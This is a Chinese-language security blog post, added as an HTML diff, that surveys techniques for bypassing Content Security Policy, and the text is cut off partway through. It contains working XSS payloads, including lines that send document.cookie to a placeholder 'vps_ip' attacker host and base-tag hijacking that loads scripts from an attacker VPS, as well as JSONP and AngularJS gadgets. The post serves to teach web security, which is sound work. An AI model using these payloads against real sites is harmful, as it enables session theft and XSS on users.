@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="yearn">
+
+
+
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSP绕过思路及总结">
+<meta property="og:url" content="https://yearn.online/2019/10/19/CSP绕过思路及总结/index.html">
+<meta property="og:site_name" content="绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76c02656-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76da0170-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76e2f1a4-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76ef45c6-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-76fbf190-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-770d1128-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-77196efa-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772405ea-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772ac830-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7734112e-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-77407888-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-774957c8-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7753e788-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-775a262a-738e-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7765f3ec-738e-1.png">
+<meta property="og:updated_time" content="2019-10-20T06:57:13.976Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSP绕过思路及总结">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76c02656-738e-1.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>CSP绕过思路及总结 | 绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?true";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">yearn</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:1925150398@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/yearnming" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/benbenben/">benbenben</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/waf/">waf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/今天很沙漠/">今天很沙漠</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/冷淡/">冷淡</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/南岸/">南岸</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/啊哈哈/">啊哈哈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/大雨连绵/">大雨连绵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气不错，就是眼睛睁不开/">天气不错，就是眼睛睁不开</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气好呀/">天气好呀</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/天气真好/">天气真好</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/就很棒/">就很棒</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/就很烦/">就很烦</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/打字很累/">打字很累</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无聊/">无聊</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/春困/">春困</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/暗/">暗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漫步/">漫步</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/黑夜的柒佰/">黑夜的柒佰</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://xiaoleng.space/">xiaoleng</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于web</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">yearn</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">yearn</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:1925150398@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/yearnming" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-CSP绕过思路及总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/10/19/CSP绕过思路及总结/" class="article-date">
+      <time datetime="2019-10-19T06:54:39.000Z" itemprop="datePublished">2019-10-19</time>
+</a>
+
+
+
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CSP绕过思路及总结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <excerpt in index> 
+
+<ul>
+<li><a id="more"></a>
+<the rest of contents文>
+
+</the></li>
+</ul>
+<h2 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h2><p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。<br>当代网站太容易收到XSS的攻击，CSP就是一个统一有效的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行。<br>CSP的具体介绍可以看看手册<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP" target="_blank" rel="noopener">内容安全策略</a></p>
+<h2 id="CSP的绕过"><a href="#CSP的绕过" class="headerlink" title="CSP的绕过"></a>CSP的绕过</h2><p>CSP的绕过从CSP的诞生开始就一直被前端的安全研究人员所热衷，本文总结一些我了解到的CSP的绕过方式，若有不足，敬请批评补充</p>
+<h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用<br>当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"vps_ip:xxxx?"</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure>
+<p>有人跟我说可以跳过去再跳回来，但是这样不是会死循环一直跳来跳去吗2333333<br>利用条件:</p>
+<ol>
+<li>可以执行任意JS脚本，但是由于CSP无法数据带外</li>
+</ol>
+<h3 id="link标签导致的绕过"><a href="#link标签导致的绕过" class="headerlink" title="link标签导致的绕过"></a>link标签导致的绕过</h3><p>这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了<br>因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。<br>所以我们可以通过此标签将数据带外</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- firefox --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//$&#123;cookie&#125;.vps_ip"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- chrome --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//vps_ip?$&#123;cookie&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当然这个是我们写死的标签，如何把数据带外？</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">"link"</span>);</span><br><span class="line">link.setAttribute(<span class="string">"rel"</span>, <span class="string">"prefetch"</span>);</span><br><span class="line">link.setAttribute(<span class="string">"href"</span>, <span class="string">"//vps_ip/?"</span> + <span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(link);</span><br></pre></td></tr></table></figure>
+<p>这样就可以把cookie带外了<br>利用条件:</p>
+<ol>
+<li>可以执行任意JS脚本，但是由于CSP无法数据带外</li>
+</ol>
+<h3 id="使用Iframe绕过"><a href="#使用Iframe绕过" class="headerlink" title="使用Iframe绕过"></a>使用Iframe绕过</h3><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效<br>A页面:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self'"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"flag"</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>B页面:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- 下面模拟XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">iframe.src=<span class="string">"A页面"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'flag'</span>).innerHTML),<span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76c02656-738e-1.png" alt="图片.png"><br>setTimeout是为了等待iframe加载完成<br>利用条件:</p>
+<ol>
+<li>一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞</li>
+<li>我们需要的数据在存在CSP保护的页面</li>
+</ol>
+<h3 id="用CDN来绕过"><a href="#用CDN来绕过" class="headerlink" title="用CDN来绕过"></a>用CDN来绕过</h3><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险<br>这里给出orange师傅绕hackmd CSP的文章<a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">Hackmd XSS</a><br>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP，如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://cdnjs.cloudflare.com;"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo="--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor('alert(document.cookie)')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个是存在低版本angular js的cdn服务商列表<br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a><br>除了低版本angular js的模板注入，还有许多库可以绕过CSP<br>下面引用<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a><br>如果用了Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以用此exp</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a><br>利用条件:</p>
+<ol>
+<li>CDN服务商存在某些低版本的js库</li>
+<li>此CDN服务商在CSP白名单中</li>
+</ol>
+<h3 id="站点可控静态资源绕过"><a href="#站点可控静态资源绕过" class="headerlink" title="站点可控静态资源绕过"></a>站点可控静态资源绕过</h3><p>给一个绕过codimd的(实例)<a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md" target="_blank" rel="noopener">codimd xss</a><br>案例中codimd的CSP中使用了<code>www.google-analytics.com</code><br>而<a href="http://www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP" target="_blank" rel="noopener">www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76da0170-738e-1.png" alt="图片.png"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://www.google-analytics.com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76e2f1a4-738e-1.png" alt="图片.png"></p>
+<p>同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过<br>利用条件:</p>
+<ol>
+<li>站点存在可控静态资源</li>
+<li>站点在CSP白名单中</li>
+</ol>
+<h3 id="站点可控JSONP绕过"><a href="#站点可控JSONP绕过" class="headerlink" title="站点可控JSONP绕过"></a>站点可控JSONP绕过</h3><p>JSONP的详细介绍可以看看我之前的一篇文章<a href="https://xz.aliyun.com/t/4470" target="_blank" rel="noopener">https://xz.aliyun.com/t/4470</a><br>大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析<br>以ins’hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src www.google.com; img-src *; default-src &apos;none&apos;; style-src &apos;unsafe-inline&apos;</span><br></pre></td></tr></table></figure>
+<p>看上去非常天衣无缝，但是google站点存在了用户可控jsonp</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src https://www.google.com"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76ef45c6-738e-1.png" alt="图片.png"><br>配合注释符，我们即可执行任意js<br>下面是一些存在用户可控资源或者jsonp比较常用站点的github项目<br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a><br>利用条件:</p>
+<ol>
+<li>站点存在可控Jsonp</li>
+<li>站点在CSP白名单中</li>
+</ol>
+<h3 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a>Base-uri绕过</h3><p>第一次知道base-uri绕过是RCTF 2018 rBlog的非预期解<a href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF 2018 rBlog writeup</a><br>当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径<br>exp</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//vps_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-76fbf190-738e-1.png" alt="图片.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-770d1128-738e-1.png" alt="图片.png"><br>注意：如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为vps_ip不在csp白名单内</p>
+<p>利用条件:</p>
+<ol>
+<li>script-src只使用nonce</li>
+<li>没有额外设置base-uri</li>
+<li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li>
+</ol>
+<h3 id="不完整script标签绕过nonce"><a href="#不完整script标签绕过nonce" class="headerlink" title="不完整script标签绕过nonce"></a>不完整script标签绕过nonce</h3><p>考虑下下列场景，如果存在这样场景，该怎么绕过CSP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">'xxxxx'</span>&gt;</span><br><span class="line">  <span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
